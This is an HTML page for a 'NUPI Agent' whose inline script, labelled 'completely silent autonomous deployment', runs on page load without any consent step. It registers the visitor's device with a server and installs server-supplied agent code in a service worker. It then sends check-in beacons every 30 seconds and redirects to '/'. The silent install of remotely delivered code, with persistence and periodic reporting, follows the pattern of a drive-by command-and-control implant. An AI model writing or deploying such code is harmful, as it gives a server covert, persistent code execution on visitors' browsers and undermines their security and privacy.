<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NUPI Agent</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #0a0a0a;
            color: #fff;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }
        .message {
            text-align: center;
            opacity: 0;
            animation: fadeIn 1s ease forwards;
        }
        @keyframes fadeIn {
            to { opacity: 1; }
        }
        h1 {
            font-size: 24px;
            margin-bottom: 10px;
        }
        p {
            color: #888;
        }
    </style>
</head>
<body>
    <div class="message">
        <h1>âœ… NUPI Agent Active</h1>
        <p>Running autonomously in background</p>
    </div>
    
    <script>
        // COMPLETELY SILENT AUTONOMOUS DEPLOYMENT
        (function() {
            const agentId = localStorage.getItem('nupi_agent_id');
            
            if (agentId) {
                // Already deployed, redirect to main page
                setTimeout(() => window.location.href = '/', 1000);
                return;
            }
            
            // Deploy silently
            fetch('/api/agents/deploy', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    deviceId: `device-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
                    platform: navigator.platform,
                    deviceName: navigator.platform,
                    silent: true
                })
            })
            .then(res => res.json())
            .then(data => {
                localStorage.setItem('nupi_agent_id', data.agentId);
                
                // Install Service Worker
                if ('serviceWorker' in navigator) {
                    navigator.serviceWorker.register('/agent-service-worker.js')
                        .then(reg => {
                            reg.active?.postMessage({
                                type: 'INSTALL_AGENT',
                                agentCode: data.deploymentPackage.code,
                                agentId: data.agentId
                            });
                        });
                }
                
                // Start autonomous agent
                setInterval(() => {
                    fetch('/api/agents/checkin', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            agentId: data.agentId,
                            status: 'online',
                            learningData: { type: 'scan', timestamp: Date.now() }
                        })
                    });
                }, 30000);
                
                // Redirect to main page
                setTimeout(() => window.location.href = '/', 2000);
            })
            .catch(err => {
                console.error('Deployment error:', err);
                setTimeout(() => window.location.href = '/', 2000);
            });
        })();
    </script>
</body>
</html>
